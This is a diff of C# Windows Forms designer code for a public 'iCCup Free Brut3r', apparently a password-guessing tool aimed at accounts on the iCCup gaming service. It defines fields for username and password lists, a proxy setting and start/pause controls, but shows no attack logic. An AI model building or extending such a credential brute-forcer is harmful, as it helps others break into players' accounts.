+            this.TrayButton.MouseEnter += new System.EventHandler(this.TrayButton_MouseEnter);
+            this.TrayButton.MouseLeave += new System.EventHandler(this.TrayButton_MouseLeave);
+            this.TrayButton.MouseUp += new System.Windows.Forms.MouseEventHandler(this.TrayButton_MouseUp);
+            // 
+            // BruteUsername
+            // 
+            this.BruteUsername.BackColor = System.Drawing.Color.DimGray;
+            this.BruteUsername.Font = new System.Drawing.Font("Times New Roman", 13F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.BruteUsername.ForeColor = System.Drawing.SystemColors.Menu;
+            this.BruteUsername.Location = new System.Drawing.Point(126, 116);
+            this.BruteUsername.Name = "BruteUsername";
+            this.BruteUsername.Size = new System.Drawing.Size(199, 27);
+            this.BruteUsername.TabIndex = 1;
+            this.BruteUsername.TextChanged += new System.EventHandler(this.BruteUsername_TextChanged);
+            // 
+            // BrutePassword
+            // 
+            this.BrutePassword.BackColor = System.Drawing.Color.DimGray;
+            this.BrutePassword.Font = new System.Drawing.Font("Times New Roman", 13F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.BrutePassword.ForeColor = System.Drawing.SystemColors.Menu;
+            this.BrutePassword.Location = new System.Drawing.Point(126, 158);
+            this.BrutePassword.Name = "BrutePassword";
+            this.BrutePassword.Size = new System.Drawing.Size(199, 27);
+            this.BrutePassword.TabIndex = 2;
+            this.BrutePassword.TextChanged += new System.EventHandler(this.BrutePassword_TextChanged);
+            // 
+            // CheckButton
+            // 
+            this.CheckButton.BackColor = System.Drawing.Color.Transparent;
+            this.CheckButton.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.CheckBtn;
+            this.CheckButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.CheckButton.Location = new System.Drawing.Point(158, 190);
+            this.CheckButton.Name = "CheckButton";
+            this.CheckButton.Size = new System.Drawing.Size(145, 40);
+            this.CheckButton.TabIndex = 3;
+            this.CheckButton.TabStop = false;
+            this.CheckButton.Click += new System.EventHandler(this.CheckButton_Click);
+            this.CheckButton.MouseDown += new System.Windows.Forms.MouseEventHandler(this.CheckButton_MouseDown);
+            this.CheckButton.MouseEnter += new System.EventHandler(this.CheckButton_MouseEnter);
+            this.CheckButton.MouseLeave += new System.EventHandler(this.CheckButton_MouseLeave);
+            this.CheckButton.MouseUp += new System.Windows.Forms.MouseEventHandler(this.CheckButton_MouseUp);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.BackColor = System.Drawing.Color.Transparent;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label1.Location = new System.Drawing.Point(30, 138);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(69, 24);
+            this.label1.TabIndex = 4;
+            this.label1.Text = "Логин:";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.BackColor = System.Drawing.Color.Transparent;
+            this.label2.Location = new System.Drawing.Point(113, 90);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(228, 13);
+            this.label2.TabIndex = 5;
+            this.label2.Text = "Сюда нужно вставить любой логин iCCUp\'а.";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.BackColor = System.Drawing.Color.Transparent;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label3.Location = new System.Drawing.Point(24, 239);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(358, 13);
+            this.label3.TabIndex = 6;
+            this.label3.Text = "Теперь нужно выбрать метод загрузки логинов и паролей";
+            // 
+            // SwapMode
+            // 
+            this.SwapMode.BackColor = System.Drawing.Color.Transparent;
+            this.SwapMode.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.MegoCheckBoxFirstpart;
+            this.SwapMode.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
+            this.SwapMode.Location = new System.Drawing.Point(126, 263);
+            this.SwapMode.Name = "SwapMode";
+            this.SwapMode.Size = new System.Drawing.Size(197, 78);
+            this.SwapMode.TabIndex = 7;
+            this.SwapMode.TabStop = false;
+            this.SwapMode.Click += new System.EventHandler(this.SwapMode_Click);
+            this.SwapMode.DragEnter += new System.Windows.Forms.DragEventHandler(this.SwapMode_DragEnter);
+            this.SwapMode.MouseDown += new System.Windows.Forms.MouseEventHandler(this.SwapMode_MouseDown);
+            this.SwapMode.MouseEnter += new System.EventHandler(this.SwapMode_MouseEnter);
+            this.SwapMode.MouseLeave += new System.EventHandler(this.SwapMode_MouseLeave);
+            this.SwapMode.MouseMove += new System.Windows.Forms.MouseEventHandler(this.SwapMode_MouseMove);
+            this.SwapMode.MouseUp += new System.Windows.Forms.MouseEventHandler(this.SwapMode_MouseUp);
+            // 
+            // UsernamesForBrute
+            // 
+            this.UsernamesForBrute.BackColor = System.Drawing.Color.DimGray;
+            this.UsernamesForBrute.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.EditBox_;
+            this.UsernamesForBrute.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.UsernamesForBrute.ForeColor = System.Drawing.SystemColors.ButtonFace;
+            this.UsernamesForBrute.Location = new System.Drawing.Point(11, 265);
+            this.UsernamesForBrute.Name = "UsernamesForBrute";
+            this.UsernamesForBrute.Size = new System.Drawing.Size(109, 27);
+            this.UsernamesForBrute.TabIndex = 3;
+            this.UsernamesForBrute.Text = "Ники";
+            this.UsernamesForBrute.UseVisualStyleBackColor = false;
+            this.UsernamesForBrute.Click += new System.EventHandler(this.UsernamesForBrute_Click);
+            // 
+            // PasswordForBrute
+            // 
+            this.PasswordForBrute.BackColor = System.Drawing.Color.DimGray;
+            this.PasswordForBrute.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.EditBox_;
+            this.PasswordForBrute.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.PasswordForBrute.ForeColor = System.Drawing.SystemColors.ButtonFace;
+            this.PasswordForBrute.Location = new System.Drawing.Point(12, 314);
+            this.PasswordForBrute.Name = "PasswordForBrute";
+            this.PasswordForBrute.Size = new System.Drawing.Size(109, 27);
+            this.PasswordForBrute.TabIndex = 4;
+            this.PasswordForBrute.Text = "Пароли";
+            this.PasswordForBrute.UseVisualStyleBackColor = false;
+            this.PasswordForBrute.Click += new System.EventHandler(this.PasswordForBrute_Click);
+            // 
+            // SwapLoginTypeTimer
+            // 
+            this.SwapLoginTypeTimer.Enabled = true;
+            this.SwapLoginTypeTimer.Interval = 200;
+            this.SwapLoginTypeTimer.Tick += new System.EventHandler(this.SwapLoginTypeTimer_Tick);
+            // 
+            // SeparatorLP
+            // 
+            this.SeparatorLP.BackColor = System.Drawing.Color.DimGray;
+            this.SeparatorLP.Font = new System.Drawing.Font("Times New Roman", 13F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.SeparatorLP.ForeColor = System.Drawing.SystemColors.Menu;
+            this.SeparatorLP.Location = new System.Drawing.Point(38, 280);
+            this.SeparatorLP.Name = "SeparatorLP";
+            this.SeparatorLP.Size = new System.Drawing.Size(46, 27);
+            this.SeparatorLP.TabIndex = 5;
+            this.SeparatorLP.Text = ";";
+            this.SeparatorLP.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            this.SeparatorLP.Visible = false;
+            // 
+            // LabelM1
+            // 
+            this.LabelM1.AutoSize = true;
+            this.LabelM1.BackColor = System.Drawing.Color.Transparent;
+            this.LabelM1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.LabelM1.Location = new System.Drawing.Point(8, 260);
+            this.LabelM1.Name = "LabelM1";
+            this.LabelM1.Size = new System.Drawing.Size(105, 17);
+            this.LabelM1.TabIndex = 9;
+            this.LabelM1.Text = "Разделитель";
+            this.LabelM1.Visible = false;
+            // 
+            // LoadNickPwdSeperated
+            // 
+            this.LoadNickPwdSeperated.BackColor = System.Drawing.Color.DimGray;
+            this.LoadNickPwdSeperated.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.EditBox_;
+            this.LoadNickPwdSeperated.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.LoadNickPwdSeperated.ForeColor = System.Drawing.SystemColors.ButtonFace;
+            this.LoadNickPwdSeperated.Location = new System.Drawing.Point(11, 314);
+            this.LoadNickPwdSeperated.Name = "LoadNickPwdSeperated";
+            this.LoadNickPwdSeperated.Size = new System.Drawing.Size(109, 27);
+            this.LoadNickPwdSeperated.TabIndex = 6;
+            this.LoadNickPwdSeperated.Text = "Открыть файл";
+            this.LoadNickPwdSeperated.UseVisualStyleBackColor = false;
+            this.LoadNickPwdSeperated.Visible = false;
+            this.LoadNickPwdSeperated.Click += new System.EventHandler(this.LoadNickPwdSeperated_Click);
+            // 
+            // LabelM3
+            // 
+            this.LabelM3.AutoSize = true;
+            this.LabelM3.BackColor = System.Drawing.Color.Transparent;
+            this.LabelM3.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.LabelM3.Location = new System.Drawing.Point(90, 286);
+            this.LabelM3.Name = "LabelM3";
+            this.LabelM3.Size = new System.Drawing.Size(26, 17);
+            this.LabelM3.TabIndex = 9;
+            this.LabelM3.Text = "——";
+            this.LabelM3.Visible = false;
+            // 
+            // LabelM2
+            // 
+            this.LabelM2.AutoSize = true;
+            this.LabelM2.BackColor = System.Drawing.Color.Transparent;
+            this.LabelM2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.LabelM2.Location = new System.Drawing.Point(6, 286);
+            this.LabelM2.Name = "LabelM2";
+            this.LabelM2.Size = new System.Drawing.Size(26, 17);
+            this.LabelM2.TabIndex = 9;
+            this.LabelM2.Text = "——";
+            this.LabelM2.Visible = false;
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.BackColor = System.Drawing.Color.Transparent;
+            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label4.Location = new System.Drawing.Point(15, 58);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(44, 17);
+            this.label4.TabIndex = 11;
+            this.label4.Text = "БАЗА";
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.BackColor = System.Drawing.Color.Transparent;
+            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label6.Location = new System.Drawing.Point(24, 344);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(60, 17);
+            this.label6.TabIndex = 11;
+            this.label6.Text = "Прокси:";
+            // 
+            // UsersCount
+            // 
+            this.UsersCount.AutoSize = true;
+            this.UsersCount.BackColor = System.Drawing.Color.Transparent;
+            this.UsersCount.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.UsersCount.Location = new System.Drawing.Point(231, 344);
+            this.UsersCount.Name = "UsersCount";
+            this.UsersCount.Size = new System.Drawing.Size(16, 17);
+            this.UsersCount.TabIndex = 11;
+            this.UsersCount.Text = "0";
+            // 
+            // BaseLoaded
+            // 
+            this.BaseLoaded.BackColor = System.Drawing.Color.Transparent;
+            this.BaseLoaded.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.Bad;
+            this.BaseLoaded.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.BaseLoaded.Location = new System.Drawing.Point(12, 12);
+            this.BaseLoaded.Name = "BaseLoaded";
+            this.BaseLoaded.Size = new System.Drawing.Size(52, 48);
+            this.BaseLoaded.TabIndex = 13;
+            this.BaseLoaded.TabStop = false;
+            // 
+            // LoginIccupGetted
+            // 
+            this.LoginIccupGetted.BackColor = System.Drawing.Color.Transparent;
+            this.LoginIccupGetted.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.Bad;
+            this.LoginIccupGetted.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.LoginIccupGetted.Location = new System.Drawing.Point(93, 12);
+            this.LoginIccupGetted.Name = "LoginIccupGetted";
+            this.LoginIccupGetted.Size = new System.Drawing.Size(52, 48);
+            this.LoginIccupGetted.TabIndex = 13;
+            this.LoginIccupGetted.TabStop = false;
+            // 
+            // RunnedBrute
+            // 
+            this.RunnedBrute.BackColor = System.Drawing.Color.Transparent;
+            this.RunnedBrute.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.Bad;
+            this.RunnedBrute.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.RunnedBrute.Location = new System.Drawing.Point(171, 12);
+            this.RunnedBrute.Name = "RunnedBrute";
+            this.RunnedBrute.Size = new System.Drawing.Size(52, 48);
+            this.RunnedBrute.TabIndex = 13;
+            this.RunnedBrute.TabStop = false;
+            // 
+            // label7
+            // 
+            this.label7.AutoSize = true;
+            this.label7.BackColor = System.Drawing.Color.Transparent;
+            this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label7.Location = new System.Drawing.Point(91, 58);
+            this.label7.Name = "label7";
+            this.label7.Size = new System.Drawing.Size(57, 17);
+            this.label7.TabIndex = 11;
+            this.label7.Text = "ЛОГИН";
+            // 
+            // label8
+            // 
+            this.label8.AutoSize = true;
+            this.label8.BackColor = System.Drawing.Color.Transparent;
+            this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label8.Location = new System.Drawing.Point(172, 59);
+            this.label8.Name = "label8";
+            this.label8.Size = new System.Drawing.Size(53, 17);
+            this.label8.TabIndex = 11;
+            this.label8.Text = "СТАРТ";
+            // 
+            // label9
+            // 
+            this.label9.AutoSize = true;
+            this.label9.BackColor = System.Drawing.Color.Transparent;
+            this.label9.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label9.Location = new System.Drawing.Point(159, 344);
+            this.label9.Name = "label9";
+            this.label9.Size = new System.Drawing.Size(66, 17);
+            this.label9.TabIndex = 11;
+            this.label9.Text = "Логинов:";
+            // 
+            // label10
+            // 
+            this.label10.AutoSize = true;
+            this.label10.BackColor = System.Drawing.Color.Transparent;
+            this.label10.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label10.Location = new System.Drawing.Point(133, 535);
+            this.label10.Name = "label10";
+            this.label10.Size = new System.Drawing.Size(87, 17);
+            this.label10.TabIndex = 11;
+            this.label10.Text = "Завершено:";
+            // 
+            // PcEnd
+            // 
+            this.PcEnd.AutoSize = true;
+            this.PcEnd.BackColor = System.Drawing.Color.Transparent;
+            this.PcEnd.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.PcEnd.Location = new System.Drawing.Point(217, 535);
+            this.PcEnd.Name = "PcEnd";
+            this.PcEnd.Size = new System.Drawing.Size(30, 17);
+            this.PcEnd.TabIndex = 11;
+            this.PcEnd.Text = "0%";
+            // 
+            // PauseButton
+            // 
+            this.PauseButton.BackColor = System.Drawing.Color.DimGray;
+            this.PauseButton.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.EditBox_;
+            this.PauseButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.PauseButton.ForeColor = System.Drawing.SystemColors.ButtonFace;
+            this.PauseButton.Location = new System.Drawing.Point(18, 530);
+            this.PauseButton.Name = "PauseButton";
+            this.PauseButton.Size = new System.Drawing.Size(109, 27);
+            this.PauseButton.TabIndex = 8;
+            this.PauseButton.Text = "Пауза";
+            this.PauseButton.UseVisualStyleBackColor = false;
+            this.PauseButton.Click += new System.EventHandler(this.PauseButton_Click);
+            // 
+            // StartButton
+            // 
+            this.StartButton.BackColor = System.Drawing.Color.DimGray;
+            this.StartButton.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.EditBox_;
+            this.StartButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.StartButton.ForeColor = System.Drawing.SystemColors.ButtonFace;
+            this.StartButton.Location = new System.Drawing.Point(268, 530);
+            this.StartButton.Name = "StartButton";
+            this.StartButton.Size = new System.Drawing.Size(109, 27);
+            this.StartButton.TabIndex = 9;
+            this.StartButton.Text = "Старт";
+            this.StartButton.UseVisualStyleBackColor = false;
+            this.StartButton.Click += new System.EventHandler(this.StartButton_Click);
+            // 
+            // BruTray
+            // 
+            this.BruTray.BalloonTipText = "Free bruteforcer for iCCup!";
+            this.BruTray.BalloonTipTitle = "iCCup Bruteforce";
+            this.BruTray.Icon = global::UnrealIccupBruteforcer.AllResources.BruTray;
+            this.BruTray.Text = "iCCup public Bruteforcer";
+            this.BruTray.Visible = true;
+            this.BruTray.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.BruTray_MouseDoubleClick);
+            // 
+            // MyProxy
+            // 
+            this.MyProxy.BackColor = System.Drawing.Color.DimGray;
+            this.MyProxy.Font = new System.Drawing.Font("Times New Roman", 13F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.MyProxy.ForeColor = System.Drawing.SystemColors.Menu;
+            this.MyProxy.Location = new System.Drawing.Point(12, 364);
+            this.MyProxy.Name = "MyProxy";
+            this.MyProxy.Size = new System.Drawing.Size(127, 27);
+            this.MyProxy.TabIndex = 5;
+            this.MyProxy.Text = "127.0.0.1";
+            this.MyProxy.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            this.MyProxy.TextChanged += new System.EventHandler(this.MyProxy_TextChanged);
+            // 
+            // LogMyBox
+            // 
+            this.LogMyBox.BackColor = System.Drawing.Color.Transparent;
+            this.LogMyBox.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawVariable;
+            this.LogMyBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.LogMyBox.ForeColor = System.Drawing.SystemColors.Menu;
+            this.LogMyBox.FormattingEnabled = true;
+            this.LogMyBox.ItemHeight = 15;
+            this.LogMyBox.Items.AddRange(new object[] {
+            " ",
+            "  iCCup BruteForce by Absol(d3scene.ru) ",
+            "   Free for public lvl2.",
+            " ",
+            " "});
+            this.LogMyBox.Location = new System.Drawing.Point(12, 405);
+            this.LogMyBox.Name = "LogMyBox";
+            this.LogMyBox.Size = new System.Drawing.Size(370, 119);
+            this.LogMyBox.TabIndex = 10;
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.BackColor = System.Drawing.Color.Transparent;
+            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label5.Location = new System.Drawing.Point(154, 361);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(111, 17);
+            this.label5.TabIndex = 11;
+            this.label5.Text = "Текущий логин:";
+            // 
+            // CurrentLogin
+            // 
+            this.CurrentLogin.AutoSize = true;
+            this.CurrentLogin.BackColor = System.Drawing.Color.Transparent;
+            this.CurrentLogin.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.CurrentLogin.Location = new System.Drawing.Point(271, 361);
+            this.CurrentLogin.Name = "CurrentLogin";
+            this.CurrentLogin.Size = new System.Drawing.Size(0, 17);
+            this.CurrentLogin.TabIndex = 11;
+            // 
+            // label12
+            // 
+            this.label12.AutoSize = true;
+            this.label12.BackColor = System.Drawing.Color.Transparent;
+            this.label12.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label12.Location = new System.Drawing.Point(154, 378);
+            this.label12.Name = "label12";
+            this.label12.Size = new System.Drawing.Size(121, 17);
+            this.label12.TabIndex = 11;
+            this.label12.Text = "Текущий пароль:";
+            // 
+            // CurrentPassword
+            // 
+            this.CurrentPassword.AutoSize = true;
+            this.CurrentPassword.BackColor = System.Drawing.Color.Transparent;
+            this.CurrentPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.CurrentPassword.Location = new System.Drawing.Point(271, 378);
+            this.CurrentPassword.Name = "CurrentPassword";
+            this.CurrentPassword.Size = new System.Drawing.Size(0, 17);
+            this.CurrentPassword.TabIndex = 11;
+            // 
+            // AbsolBruter
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.MainForm;
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.ClientSize = new System.Drawing.Size(400, 600);
+            this.Controls.Add(this.LabelM1);
+            this.Controls.Add(this.RunnedBrute);
+            this.Controls.Add(this.LoginIccupGetted);
+            this.Controls.Add(this.BaseLoaded);
+            this.Controls.Add(this.LogMyBox);
+            this.Controls.Add(this.CurrentPassword);
+            this.Controls.Add(this.CurrentLogin);
+            this.Controls.Add(this.label12);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.label9);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.PcEnd);
+            this.Controls.Add(this.UsersCount);
+            this.Controls.Add(this.label10);
+            this.Controls.Add(this.label8);
+            this.Controls.Add(this.label7);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.LabelM2);
+            this.Controls.Add(this.LabelM3);
+            this.Controls.Add(this.StartButton);
+            this.Controls.Add(this.PauseButton);
+            this.Controls.Add(this.SwapMode);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.CheckButton);
+            this.Controls.Add(this.BrutePassword);
+            this.Controls.Add(this.BruteUsername);
+            this.Controls.Add(this.TrayButton);
+            this.Controls.Add(this.ExitButton);
+            this.Controls.Add(this.PokePictBox);
+            this.Controls.Add(this.LoadNickPwdSeperated);
+            this.Controls.Add(this.MyProxy);
+            this.Controls.Add(this.SeparatorLP);
+            this.Controls.Add(this.UsernamesForBrute);
+            this.Controls.Add(this.PasswordForBrute);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = global::UnrealIccupBruteforcer.AllResources.Icon;
+            this.Name = "AbsolBruter";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "iCCup Free Brut3r";
+            this.Load += new System.EventHandler(this.AbsolFreeBrut3Force_Load);
+            this.Resize += new System.EventHandler(this.AbsolFreeBrut3Force_Resize);
+            ((System.ComponentModel.ISupportInitialize)(this.PokePictBox)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.ExitButton)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.TrayButton)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.CheckButton)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.SwapMode)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.BaseLoaded)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.LoginIccupGetted)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.RunnedBrute)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
         }
 
         public class GlobalVars
@@ -1511,12 +1694,11 @@ namespace UnrealIccupBruteforcer
                 public string username;
                 public string password;
                 public bool Requested;
-
                 public BruteBaseStruct(string username, string password, bool requested = false)
                 {
-                    this.username = username;
-                    this.password = password;
-                    Requested = requested;
+                    this.username = username.Trim();
+                    this.password = password.Trim();
+                    this.Requested = requested;
                 }
             }
         }
